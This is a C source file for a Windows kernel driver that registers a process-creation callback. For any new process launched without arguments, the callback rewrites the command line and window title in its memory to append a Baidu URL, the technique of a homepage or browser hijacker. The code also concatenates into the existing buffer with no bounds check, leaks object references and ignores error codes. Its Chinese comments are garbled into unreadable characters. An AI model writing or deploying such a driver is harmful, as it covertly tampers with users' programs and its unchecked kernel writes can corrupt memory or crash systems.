#include "work.h"



//�ص�
VOID CreateProcessNotify(
	IN HANDLE ParentId,
	IN HANDLE ProcessId,
	IN BOOLEAN Create
	)
{
	NTSTATUS                status = STATUS_SUCCESS;
	PEPROCESS                pEprocess = NULL;

	// ��������
	if (Create)
	{
		status = PsLookupProcessByProcessId(ProcessId, &pEprocess);
		if (NT_SUCCESS(status))
		{
			PFILE_OBJECT        FilePointer = NULL;

			status = PsReferenceProcessFilePointer((PEPROCESS)pEprocess, &FilePointer);
				KAPC_STATE ApcState; PPEB peb;
				KeStackAttachProcess(pEprocess, &ApcState);
				peb = PsGetProcessPeb(pEprocess);
				//DbgPrint("++++%wZ+++++%wZ\r\n", &peb->ProcessParameters->CommandLine, &peb->ProcessParameters->ImagePathName);
				
				if (peb->ProcessParameters->CommandLine.Length - peb->ProcessParameters->ImagePathName.Length <= 6)
				{
					
					PWCHAR *tmp = peb->ProcessParameters->CommandLine.Buffer;
					
					wcscat(tmp, L"http://www.baidu.com/");
					UNICODE_STRING Unicode_tmp;
					RtlInitUnicodeString(&Unicode_tmp, tmp);
					peb->ProcessParameters->CommandLine = Unicode_tmp;
					

					peb->ProcessParameters->WindowTitle = Unicode_tmp;
				
					DbgPrint("--->%wZ\r\n", &peb->ProcessParameters->CommandLine);
				}
				else
				{
					
				}
				
			

				

					KeUnstackDetachProcess(&ApcState);
		
		}
	}
	else
	{
		// ��������
	}

}


VOID SetWork(IN BOOLEAN bState)
{
	NTSTATUS status;

	if (bState)
	{
		// ע��ص�
		status = PsSetCreateProcessNotifyRoutine(CreateProcessNotify, FALSE);
		if (!NT_SUCCESS(status))
		{
			DbgPrint("�ص�ע��ʧ��!");
			return;
		}
	}
	else
	{
		status = PsSetCreateProcessNotifyRoutine(CreateProcessNotify, TRUE);
		if (!NT_SUCCESS(status))
		{
			DbgPrint("�ص�ժ��ʧ��!");
			return;
		}
	}




}



// ��ȡ����·��
VOID GetProcessPath(ULONG eprocess, PUNICODE_STRING pFilePath)
{
	PFILE_OBJECT        FilePointer = NULL;
	UNICODE_STRING        name;  //�̷�
	NTSTATUS                status = STATUS_SUCCESS;
	status = PsReferenceProcessFilePointer((PEPROCESS)eprocess, &FilePointer);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("break out");
	}

	ObReferenceObjectByPointer(
		(PVOID)FilePointer,
		0,
		NULL,
		KernelMode);
	RtlVolumeDeviceToDosName((FilePointer)->DeviceObject, &name); //��ȡ�̷���
	RtlCopyUnicodeString(pFilePath, &name); //�̷�����
	RtlAppendUnicodeStringToString(pFilePath, &(FilePointer)->FileName); //·������
	ObDereferenceObject(FilePointer);                //�رն�������
}